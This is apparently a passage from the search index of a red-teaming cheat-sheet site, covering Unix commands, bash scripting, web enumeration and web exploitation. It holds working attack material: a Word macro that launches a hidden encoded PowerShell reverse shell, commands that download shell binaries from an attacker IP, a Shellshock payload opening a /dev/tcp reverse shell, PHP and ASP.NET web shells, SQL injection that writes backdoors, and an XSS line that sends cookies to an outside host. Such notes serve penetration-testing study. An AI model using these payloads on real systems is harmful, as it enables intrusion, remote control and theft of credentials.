( 0 , len ( str ), n ): print \"Str = Str + \" + '\"' + str [ i : i + n ] + '\"' Sub AutoOpen () ReverseShell End Sub Sub Document_Open () ReverseShell End Sub Sub ReverseShell () Dim Str As String Str = Str + \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad\" Str = Str + \"ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA\" ... Str = Str + \"yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA\" Str = Str + \"G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM\" Str = Str + \"AdABhAHIAdAAoACQAcwApADsA\" CreateObject ( \"Wscript.Shell\" ) .Run Str End Sub","title":"Microsoft Word Macro"},{"location":"red-teaming/social-engineering/#object-linking-and-embedding","text":"ReverseShell.bat START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...","title":"Object Linking and Embedding"},{"location":"red-teaming/social-engineering/#web-phishing","text":"","title":"Web Phishing"},{"location":"red-teaming/unix-system/commands/","text":"Unix Command Line Manual page guide man <key search> man -k '^passwd$' In Manual page, execute !/bin/bash to spawn a shell. File Permissions Unix Filesystem Wiki Unix filesystem /bin - basic programs (ls, cd, cat, etc.) /sbin - system programs (fdisk, mkfs, sysctl, etc) /etc - configuration files /tmp - temporary files (typically deleted on boot) /usr/bin - applications (apt, ncat, nmap, etc.) /usr/share - application support and data files View the file's permssion stat ls stat myfile ls -l myfile Play with text and files Terminal editor vi nano vi -c ':!/bin/sh' /dev/null vi :set shell = /bin/sh :shell nano ^R^X reset ; sh 1 > & 0 2 > & 0 sudo nano /var/opt/../../etc/sudoers Finding finding files history, bashrc, backup Binaries That AutoElevate Spawn shell find / -name \"<name>\" find / -name *history* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null find / -perm -u = s -type f 2 >/dev/null find . -exec /bin/sh \\; Downloading wget curl axel wget -O /tmp/shell http://192.168.110.131/shell.elf wget <uri> -P /path/to/ curl -o /tmp/shell http://192.168.110.131/shell.elf axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf Output Filtering sed cut awk uniq -c grep sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' echo \"hacking, penetration testing and bug hunting\" | cut -f 2 -d \" \" cut -d \":\" -f 1 /etc/passwd cat /etc/passwd | awk -F \":\" '{print $1, \":\", $7}' | grep \"sh\" cat list.txt | sort | uniq -c | sort -r ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' grep -v \"Nmap\" Redirect save file using cat to a New File to an Existing File from a File STDERR cat > filename <<EOL Some text content Some text content 2 Some text content 3 EOL ls > list.txt cat list.txt Desktop Documents list.txt echo \"Add new\" >> list.txt wc -m < list.txt find / -perm -u = s -type f 2 >/dev/null Processes Running services and kill ps -ef ps aux ps -fC <process-name> kill <id> Checking running services sudo ss -antlp Checking all available services systemctl list-unit-files Monitoring tail watch sudo tail -f /var/log/apache2/access.log watch -n 1 <command> SSH Service sudo systemctl start ssh Start SSH service automatically at boot time. sudo systemctl enable ssh Web Service Apache2 sudo systemctl start apache2 Python python3 -m http.server 80 python -m SimpleHTTPServer 80 php php -S 0 .0.0.0:80 busybox busybox httpd -f -p 80 Start HTTP service automatically at boot time. sudo systemctl enable apache2 Screenshot cutycapt --url = $ip --out = $ip .png","title":"Commands"},{"location":"red-teaming/unix-system/commands/#unix-command-line","text":"","title":"Unix Command Line"},{"location":"red-teaming/unix-system/commands/#manual-page-guide","text":"man <key search> man -k '^passwd$' In Manual page, execute !/bin/bash to spawn a shell.","title":"Manual page guide"},{"location":"red-teaming/unix-system/commands/#file-permissions","text":"","title":"File Permissions"},{"location":"red-teaming/unix-system/commands/#unix-filesystem","text":"Wiki Unix filesystem /bin - basic programs (ls, cd, cat, etc.) /sbin - system programs (fdisk, mkfs, sysctl, etc) /etc - configuration files /tmp - temporary files (typically deleted on boot) /usr/bin - applications (apt, ncat, nmap, etc.) /usr/share - application support and data files View the file's permssion stat ls stat myfile ls -l myfile","title":"Unix Filesystem"},{"location":"red-teaming/unix-system/commands/#play-with-text-and-files","text":"","title":"Play with text and files"},{"location":"red-teaming/unix-system/commands/#terminal-editor","text":"vi nano vi -c ':!/bin/sh' /dev/null vi :set shell = /bin/sh :shell nano ^R^X reset ; sh 1 > & 0 2 > & 0 sudo nano /var/opt/../../etc/sudoers","title":"Terminal editor"},{"location":"red-teaming/unix-system/commands/#finding","text":"finding files history, bashrc, backup Binaries That AutoElevate Spawn shell find / -name \"<name>\" find / -name *history* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null find / -perm -u = s -type f 2 >/dev/null find . -exec /bin/sh \\;","title":"Finding"},{"location":"red-teaming/unix-system/commands/#downloading","text":"wget curl axel wget -O /tmp/shell http://192.168.110.131/shell.elf wget <uri> -P /path/to/ curl -o /tmp/shell http://192.168.110.131/shell.elf axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf","title":"Downloading"},{"location":"red-teaming/unix-system/commands/#output-filtering","text":"sed cut awk uniq -c grep sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' echo \"hacking, penetration testing and bug hunting\" | cut -f 2 -d \" \" cut -d \":\" -f 1 /etc/passwd cat /etc/passwd | awk -F \":\" '{print $1, \":\", $7}' | grep \"sh\" cat list.txt | sort | uniq -c | sort -r ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' grep -v \"Nmap\"","title":"Output Filtering"},{"location":"red-teaming/unix-system/commands/#redirect","text":"save file using cat to a New File to an Existing File from a File STDERR cat > filename <<EOL Some text content Some text content 2 Some text content 3 EOL ls > list.txt cat list.txt Desktop Documents list.txt echo \"Add new\" >> list.txt wc -m < list.txt find / -perm -u = s -type f 2 >/dev/null","title":"Redirect"},{"location":"red-teaming/unix-system/commands/#processes","text":"","title":"Processes"},{"location":"red-teaming/unix-system/commands/#running-services-and-kill","text":"ps -ef ps aux ps -fC <process-name> kill <id> Checking running services sudo ss -antlp Checking all available services systemctl list-unit-files","title":"Running services and kill"},{"location":"red-teaming/unix-system/commands/#monitoring","text":"tail watch sudo tail -f /var/log/apache2/access.log watch -n 1 <command>","title":"Monitoring"},{"location":"red-teaming/unix-system/commands/#ssh-service","text":"sudo systemctl start ssh Start SSH service automatically at boot time. sudo systemctl enable ssh","title":"SSH Service"},{"location":"red-teaming/unix-system/commands/#web-service","text":"Apache2 sudo systemctl start apache2 Python python3 -m http.server 80 python -m SimpleHTTPServer 80 php php -S 0 .0.0.0:80 busybox busybox httpd -f -p 80 Start HTTP service automatically at boot time. sudo systemctl enable apache2","title":"Web Service"},{"location":"red-teaming/unix-system/commands/#screenshot","text":"cutycapt --url = $ip --out = $ip .png","title":"Screenshot"},{"location":"red-teaming/unix-system/terminal/","text":"Terminal Bash Environment echo $PATH Set an environment variable export ip = <ip> ping $ip nmap $ip All environment variables env Custom terminal alias cpu = \"grep 'cpu ' /proc/stat | awk '{usage=(\\$2+\\$4)*100/(\\$2+\\$4+\\$5)} END {print usage}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias ram = \"free | grep Mem | awk '{print \\$3/\\$2 * 100.0}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias myip = 'ip add | grep \"inet \" | grep -v \"127.0.0.1\" | cut -d\"/\" -f1 | cut -d \" \" -f 6 | tail -1' PROMPT = $'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}Hades%(#.\ud83d\udc80.\u327f)%b$(myip)%F{%(#.blue.green)})-[$(cpu):$(ram)]%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} ' Background commands Background a process Suspend and bg jobs and fg nmap -p- 127 .0.0.1 & nmap -p- $ip -Pn ^Z bg \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.1 ] ~ \u2514\u2500$ jobs [ 1 ] + running nmap -p- 192 .168.11.131 -Pn \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .8:11.4 ] ~ \u2514\u2500$ fg [ 1 ] + running nmap -p- 192 .168.11.131 -Pn ^C History Re-run the first command !1 Repeats the last command !! Exit code Exit code 0 denotes a program\u2019s successful execution. Non-zero exit code denotes an unsuccessful execution of a program echo $? Bash Scripting https://devhints.io/bash https://github.com/leecybersec/scripting Hello World Running hello_world.sh chmod +x hello_world.sh ./hello_world.sh #!/bin/bash echo \"Hello World!\" My Self Script Running my_self.sh chmod +x my_self.sh ./my_self.sh #!/bin/bash ip = \" $( ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' ) \" name = ` whoami ` echo \"I'm $name \" echo \"My IP is $ip \" echo \"Command: ping -c 2 $ip \" ping -c 2 $ip Arguments and If Else Arguments If Else Elif $0 The name of the Bash script $1 -$9 The first 9 arguments to the Bash script $# Number of arguments passed to the Bash script $@ All arguments passed to the Bash script $? The exit status of the most recently run process $$ The process ID of the current script $USER The username of the user running the script $HOSTNAME The hostname of the machine $RANDOM A random number $LINENO The current line number in the script !EXPRESSION The EXPRESSION is false. -n STRING STRING length is greater than zero -z STRING The length of STRING is zero (empty) STRING1 != STRING2 STRING1 is not equal to STRING2 STRING1 = STRING2 STRING1 is equal to STRING2 INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2 INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2 INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2 INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2 INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2 INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2 -d FILE FILE exists and is a directory -e FILE FILE exists -r FILE FILE exists and has read permission -s FILE FILE exists and it is not empty -w FILE FILE exists and has write permission -x FILE FILE exists and has execute permission Nmap All Ports Scan Script Running nmap_all_ports.sh chmod +x nmap_all_ports.sh ./nmap_all_ports.sh 127 .0.0.1 #!/bin/bash if [ $# -eq 0 ] || [ $1 = \"-h\" ] || [ $1 = \"--help\" ] then echo \"Usage: $0 <HOST>\" exit else ports = $( nmap -p- --min-rate 1000 $1 | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) if [ -z $ports ] then echo \"No open port!\" exit else echo \"Opening port: $ports \" nmap -sC -sV -p $ports $1 fi fi Loops and Functions Loops Functions for var-name in <list> do <action to perform> done while [ <some test> ] do <perform an action> done function function_name { commands... } function_name () { commands... } Auto Enum Script Running auto_enum.sh chmod +x auto_enum.sh ./auto_enum.sh 127 .0.0.1 #!/bin/bash RED = '\\033[0;31m' YELLOW = '\\033[0;33m' GREEN = '\\033[0;32m' NC = '\\033[0m' origIFS = \" ${ IFS } \" if [ -z $1 ] ; then echo \"Usage: $0 <HOST>\" exit else host = $1 ports = $2 service = $3 fi enum_all_port () { printf \"\\n ${ YELLOW } Scanning openning port ...\\n ${ NC } \" if [ -z $ports ] ; then ports = $( nmap -sS -p- --min-rate 1000 $host | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) fi if [ -z $ports ] ; then printf \" ${ RED } [-] Found no openning port! ${ NC } \" exit else printf \" ${ GREEN } [+] Openning ports: $ports \\n ${ NC } \" array_ports = $( echo $ports | tr ',' '\\n' ) fi } enum_open_service () { printf \"\\n ${ YELLOW } ===============================services===============================\\n ${ NC } \" echo \"nmap -sC -sV -Pn $1 -p $2 \" nmap -sC -sV $host -p $ports } enum_smtp_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"nmap $host -p $port -Pn --script=smtp-*\" nmap $host -p $port --script = smtp-* } enum_web_service () { printf \"\\n ${ YELLOW } =============================== $url ===============================\\n ${ NC } \" printf \"\\n ${ GREEN } [+] Files and directories\\n ${ NC } \" echo \"gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt\" gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt printf \"\\n ${ GREEN } [+] All URLs\\n ${ NC } \" curl -k $url : $port -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' } enum_smb_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"smbmap -H $host \" smbmap -H $host echo \"smbclient -L $host \" smbclient -NL $host } recon () { if [ -z $service ] ; then for port in $array_ports ; do if [ $port = \"25\" ] ; then enum_smtp_service $host $port elif [ $port = \"80\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $port = \"443\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $port = \"445\" ] ; then enum_smb_service $host $port fi done else port = $ports if [ $service = \"smtp\" ] ; then enum_smtp_service $host $port elif [ $service = \"http\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $service = \"https\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $service = \"smb\" ] ; then enum_smb_service $host $port fi fi } main () { enum_all_port $host $ports enum_open_service $host $ports recon $array_ports $service } main","title":"Terminal"},{"location":"red-teaming/unix-system/terminal/#terminal","text":"","title":"Terminal"},{"location":"red-teaming/unix-system/terminal/#bash-environment","text":"echo $PATH","title":"Bash Environment"},{"location":"red-teaming/unix-system/terminal/#set-an-environment-variable","text":"export ip = <ip> ping $ip nmap $ip","title":"Set an environment variable"},{"location":"red-teaming/unix-system/terminal/#all-environment-variables","text":"env","title":"All environment variables"},{"location":"red-teaming/unix-system/terminal/#custom-terminal","text":"alias cpu = \"grep 'cpu ' /proc/stat | awk '{usage=(\\$2+\\$4)*100/(\\$2+\\$4+\\$5)} END {print usage}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias ram = \"free | grep Mem | awk '{print \\$3/\\$2 * 100.0}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\" alias myip = 'ip add | grep \"inet \" | grep -v \"127.0.0.1\" | cut -d\"/\" -f1 | cut -d \" \" -f 6 | tail -1' PROMPT = $'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}Hades%(#.\ud83d\udc80.\u327f)%b$(myip)%F{%(#.blue.green)})-[$(cpu):$(ram)]%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '","title":"Custom terminal"},{"location":"red-teaming/unix-system/terminal/#background-commands","text":"Background a process Suspend and bg jobs and fg nmap -p- 127 .0.0.1 & nmap -p- $ip -Pn ^Z bg \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .7:11.1 ] ~ \u2514\u2500$ jobs [ 1 ] + running nmap -p- 192 .168.11.131 -Pn \u250c\u2500\u2500 ( Hades\u327f192.168.11.130 ) - [ 0 .8:11.4 ] ~ \u2514\u2500$ fg [ 1 ] + running nmap -p- 192 .168.11.131 -Pn ^C","title":"Background commands"},{"location":"red-teaming/unix-system/terminal/#history","text":"","title":"History"},{"location":"red-teaming/unix-system/terminal/#re-run-the-first-command","text":"!1","title":"Re-run the first command"},{"location":"red-teaming/unix-system/terminal/#repeats-the-last-command","text":"!!","title":"Repeats the last command"},{"location":"red-teaming/unix-system/terminal/#exit-code","text":"Exit code 0 denotes a program\u2019s successful execution. Non-zero exit code denotes an unsuccessful execution of a program echo $?","title":"Exit code"},{"location":"red-teaming/unix-system/terminal/#bash-scripting","text":"https://devhints.io/bash https://github.com/leecybersec/scripting","title":"Bash Scripting"},{"location":"red-teaming/unix-system/terminal/#hello-world","text":"Running hello_world.sh chmod +x hello_world.sh ./hello_world.sh #!/bin/bash echo \"Hello World!\"","title":"Hello World"},{"location":"red-teaming/unix-system/terminal/#my-self-script","text":"Running my_self.sh chmod +x my_self.sh ./my_self.sh #!/bin/bash ip = \" $( ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d ' ' ) \" name = ` whoami ` echo \"I'm $name \" echo \"My IP is $ip \" echo \"Command: ping -c 2 $ip \" ping -c 2 $ip","title":"My Self Script"},{"location":"red-teaming/unix-system/terminal/#arguments-and-if-else","text":"Arguments If Else Elif $0 The name of the Bash script $1 -$9 The first 9 arguments to the Bash script $# Number of arguments passed to the Bash script $@ All arguments passed to the Bash script $? The exit status of the most recently run process $$ The process ID of the current script $USER The username of the user running the script $HOSTNAME The hostname of the machine $RANDOM A random number $LINENO The current line number in the script !EXPRESSION The EXPRESSION is false. -n STRING STRING length is greater than zero -z STRING The length of STRING is zero (empty) STRING1 != STRING2 STRING1 is not equal to STRING2 STRING1 = STRING2 STRING1 is equal to STRING2 INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2 INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2 INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2 INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2 INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2 INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2 -d FILE FILE exists and is a directory -e FILE FILE exists -r FILE FILE exists and has read permission -s FILE FILE exists and it is not empty -w FILE FILE exists and has write permission -x FILE FILE exists and has execute permission Nmap All Ports Scan Script Running nmap_all_ports.sh chmod +x nmap_all_ports.sh ./nmap_all_ports.sh 127 .0.0.1 #!/bin/bash if [ $# -eq 0 ] || [ $1 = \"-h\" ] || [ $1 = \"--help\" ] then echo \"Usage: $0 <HOST>\" exit else ports = $( nmap -p- --min-rate 1000 $1 | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) if [ -z $ports ] then echo \"No open port!\" exit else echo \"Opening port: $ports \" nmap -sC -sV -p $ports $1 fi fi","title":"Arguments and If Else"},{"location":"red-teaming/unix-system/terminal/#loops-and-functions","text":"Loops Functions for var-name in <list> do <action to perform> done while [ <some test> ] do <perform an action> done function function_name { commands... } function_name () { commands... }","title":"Loops and Functions"},{"location":"red-teaming/unix-system/terminal/#auto-enum-script","text":"Running auto_enum.sh chmod +x auto_enum.sh ./auto_enum.sh 127 .0.0.1 #!/bin/bash RED = '\\033[0;31m' YELLOW = '\\033[0;33m' GREEN = '\\033[0;32m' NC = '\\033[0m' origIFS = \" ${ IFS } \" if [ -z $1 ] ; then echo \"Usage: $0 <HOST>\" exit else host = $1 ports = $2 service = $3 fi enum_all_port () { printf \"\\n ${ YELLOW } Scanning openning port ...\\n ${ NC } \" if [ -z $ports ] ; then ports = $( nmap -sS -p- --min-rate 1000 $host | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) fi if [ -z $ports ] ; then printf \" ${ RED } [-] Found no openning port! ${ NC } \" exit else printf \" ${ GREEN } [+] Openning ports: $ports \\n ${ NC } \" array_ports = $( echo $ports | tr ',' '\\n' ) fi } enum_open_service () { printf \"\\n ${ YELLOW } ===============================services===============================\\n ${ NC } \" echo \"nmap -sC -sV -Pn $1 -p $2 \" nmap -sC -sV $host -p $ports } enum_smtp_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"nmap $host -p $port -Pn --script=smtp-*\" nmap $host -p $port --script = smtp-* } enum_web_service () { printf \"\\n ${ YELLOW } =============================== $url ===============================\\n ${ NC } \" printf \"\\n ${ GREEN } [+] Files and directories\\n ${ NC } \" echo \"gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt\" gobuster dir -k -u $url : $port -w /usr/share/seclists/Discovery/Web-Content/common.txt printf \"\\n ${ GREEN } [+] All URLs\\n ${ NC } \" curl -k $url : $port -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' } enum_smb_service () { printf \"\\n ${ YELLOW } =============================== $port ===============================\\n ${ NC } \" echo \"smbmap -H $host \" smbmap -H $host echo \"smbclient -L $host \" smbclient -NL $host } recon () { if [ -z $service ] ; then for port in $array_ports ; do if [ $port = \"25\" ] ; then enum_smtp_service $host $port elif [ $port = \"80\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $port = \"443\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $port = \"445\" ] ; then enum_smb_service $host $port fi done else port = $ports if [ $service = \"smtp\" ] ; then enum_smtp_service $host $port elif [ $service = \"http\" ] ; then url = \"http:// $host \" enum_web_service $url $port elif [ $service = \"https\" ] ; then url = \"https:// $host \" enum_web_service $url $port elif [ $service = \"smb\" ] ; then enum_smb_service $host $port fi fi } main () { enum_all_port $host $ports enum_open_service $host $ports recon $array_ports $service } main","title":"Auto Enum Script"},{"location":"red-teaming/web-application/enumeration/","text":"Enumeration Enum follow Inspecting URLs Inspecting Page Content Viewing Response Headers Inspecting Sitemaps robots.txt , sitemap.xml Locating Administration Consoles curl http:// $ip curl http:// $ip -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' Recon web Check cookies Check the redirection Check SQLi admin' or '1'='1 Check credentials admin and Admin , admin and admin Authentication Check IDOR Check .js, .json Check Object-relational mapping (&admin[admin]=1) Virtual hosting Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http:// $host -H 'Host: FUZZ.$domain' -fw number gobuster vhost -u pit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt Reference: https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing Web Discovery ffuf ffuf -s -w /usr/share/seclists/Discovery/Web-Content/common.txt -u \" $url : $port /FUZZ\" -e $ext -fw number gobuster gobuster dir -u http:// $ip /cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/ -x txt,sh,php,cgi -s '200,204,403,500' dirb dirb http:// $ip : $port / /usr/share/wordlists/dirb/common.txt -r Nikto nikto -h $ip","title":"Enumeration"},{"location":"red-teaming/web-application/enumeration/#enumeration","text":"","title":"Enumeration"},{"location":"red-teaming/web-application/enumeration/#enum-follow","text":"Inspecting URLs Inspecting Page Content Viewing Response Headers Inspecting Sitemaps robots.txt , sitemap.xml Locating Administration Consoles curl http:// $ip curl http:// $ip -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//'","title":"Enum follow"},{"location":"red-teaming/web-application/enumeration/#recon-web","text":"Check cookies Check the redirection Check SQLi admin' or '1'='1 Check credentials admin and Admin , admin and admin Authentication Check IDOR Check .js, .json Check Object-relational mapping (&admin[admin]=1)","title":"Recon web"},{"location":"red-teaming/web-application/enumeration/#virtual-hosting","text":"Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http:// $host -H 'Host: FUZZ.$domain' -fw number gobuster vhost -u pit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt Reference: https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing","title":"Virtual hosting"},{"location":"red-teaming/web-application/enumeration/#web-discovery","text":"ffuf ffuf -s -w /usr/share/seclists/Discovery/Web-Content/common.txt -u \" $url : $port /FUZZ\" -e $ext -fw number gobuster gobuster dir -u http:// $ip /cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/ -x txt,sh,php,cgi -s '200,204,403,500' dirb dirb http:// $ip : $port / /usr/share/wordlists/dirb/common.txt -r","title":"Web Discovery"},{"location":"red-teaming/web-application/enumeration/#nikto","text":"nikto -h $ip","title":"Nikto"},{"location":"red-teaming/web-application/exploitation/","text":"Exploitation Credentials Create Passwd Directory for Brute Force cewl -m 5 http:// $ip /joomla/ > passwd.txt Default Credentials ls /usr/share/seclists/Passwords/Default-Credentials Crack hash john hash --wordlist = /home/kali/tools/directory/rockyou.txt Broute force hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192 .168.169.106 --http-post-form '/login:user=^USER^,pass=^PASS^:Unauthorized' Directory Traversal Unix /etc/passwd Windows c:\\windows\\system32\\drivers\\etc\\hosts PHP Wrappers Inject php code via plantext http://ip/file.php?file = data:text/plain,<?php echo shell_exec ( \"dir\" ) ?> Inject php code via base64 http://ip/file.php?file = data: ; base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4 = & x = dir Encode base64 file before read it. http://ip/file.php?file = php://filter/read = convert.base64-encode/resource = /etc/passwd File Inclusion Local File Inclusion Null byte: %00 Write payload to access.log file $ nc -nv 192 .168.11.131 80 ( UNKNOWN ) [ 192 .168.11.131 ] 80 ( http ) open <?php echo '<pre>' . shell_exec ( $_GET [ 'cmd' ]) . '</pre>' ; ?> Get RCE via file inclusion curl http://192.168.11.131/file.php?file = c: \\x ampp \\a pache \\l ogs \\a ccess.log & cmd = ipconfig Remote File Inclusion <?php echo shell_exec ( $_GET [ 'cmd' ]); ?> curl http://target/?page = http:// $ip /backdoor.txt & cmd = id SQL Injection Authentication Bypass admin ' or 1 = 1 LIMIT 1 ; # Enumerating the Database order by 3 union all select 1 , 2 , 3 union all select 1 , @@version, 3 union all select 1 , table_name from information_schema.tables, 3 union all select 1 , column_name from information_schema.columns where table_name = 'users' , 3 union all select 1 , username, password from users SQLi to Code Execution Read file union all select 1 , load_file ( 'C:/Windows/System32/drivers/etc/hosts' ) , 3 Write backdoor union all select 1 , \"<?php echo shell_exec( $_GET ['cmd']);?>\" into OUTFILE 'c:/xampp/htdocs/backdoor.php' , 3 priority = Normal ' UNION SELECT (' <?php echo exec ( $_GET [ \"c\" ]) ; ') INTO OUTFILE ' /srv/http/c.php ' ; -- - Automating SQL Injection sqlmap B: Boolean-based blind E: Error-based U: Union query-based S: Stacked queries T: Time-based blind Q: Inline queries sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" dump databases sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --dump execute a shell sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --os-shell file post sqlmap -r req --dbms mysql -p limit --level 3 --batch --technique = S --os-shell Shellshock POC curl -H \"user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/ $myip /445 0>&1'\" http:// $ip /cgi-bin/user.sh Command Execution ; id ` id ` $( id ) Code Execution Ruby eval \"\\\"\" +params [ '1' ] + \"\\\"\" ?1 = \"%2b`id`%2b\" Python eval ( '\"' +1+ '\"' ) \"%2bos.system('id')%2b\" \"%2bos.popen('id').read()%2b\" \"%2b__import__('os').popen('id').read()%2b\" \"%2b__import__('os').popen(__import__('base64').b64decode('aWQ=')).read()%2b\" Perl eval ( \"return '\" . $FORM { 1 } . \"'\" ) ; /cgi-bin/form?1 = '.`id`.' PHP eval() $s = \"echo \\\"\" . $_GET [ '1' ] . \"\\\";\" ; eval ( $s ) ; ?1 = \".system('id').\" usort() $1 = $_GET [ \"1\" ] ; usort ( function ( '$a, $b' , 'return strcmp($a->' . $1 . ',$b->' . $1 . ');' )) ; ?1 = id ) ; } system ( 'id' ) ; // preg_replace() preg_replace ( $_GET [ \"1\" ] , $_GET [ \"2\" ] , $_GET [ \"3\" ]) ; ?1 = /x/e & 2 = system ( 'id' ) & 3 = x assert() assert ( trim ( \"'\" . $_GET [ '1' ] . \"'\" )) ; echo htmlentities ( $_GET [ '1' ]) ; ?1 = hacker '.system(' id ').' site.master to RCE <%@ Language=\"C#\" src=\"site.master.cs\" Inherits=\"MyNamespaceMaster.MyClassMaster\" %> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\"> <head runat=\"server\"> <title>Butch</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <meta name=\"application-name\" content=\"Butch\"> <meta name=\"author\" content=\"Butch\"> <meta name=\"description\" content=\"Butch\"> <meta name=\"keywords\" content=\"Butch\"> <link media=\"all\" href=\"style.css\" rel=\"stylesheet\" type=\"text/css\" /> <link id=\"favicon\" rel=\"shortcut icon\" type=\"image/png\" href=\"favicon.png\" /> </head> <body> <div id=\"wrap\"> <div id=\"header\">Welcome to Butch Repository</div> <div id=\"main\"> <div id=\"content\"> <br /> <asp:contentplaceholder id=\"ContentPlaceHolder1\" runat=\"server\"></asp:contentplaceholder> <br /> </div> </div> </div> </body> </html> <% string stdout = \"\"; string cmd = \"whoami\"; System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(\"cmd\", \"/c \" + cmd); procStartInfo.RedirectStandardOutput = true; procStartInfo.UseShellExecute = false; procStartInfo.CreateNoWindow = true; System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo = procStartInfo; p.Start(); stdout = p.StandardOutput.ReadToEnd(); Response.Write(stdout); %> </body> </html> nt authority\\system XSS Basic Exploit Break code < > ' \" { } ; Content Injection <iframe src=http://ip/report height=\"0\" width=\"0\"></iframe> Stealing Cookies and Session Information <script>new Image().src=\"http://10.11.0.4/cool.jpg?output=\"+document.cookie;</script>","title":"Exploitation"},{"location":"red-teaming/web-application/exploitation/#exploitation","text":"","title":"Exploitation"},{"location":"red-teaming/web-application/exploitation/#credentials","text":"Create Passwd Directory for Brute Force cewl -m 5 http:// $ip /joomla/ > passwd.txt Default Credentials ls /usr/share/seclists/Passwords/Default-Credentials Crack hash john hash --wordlist = 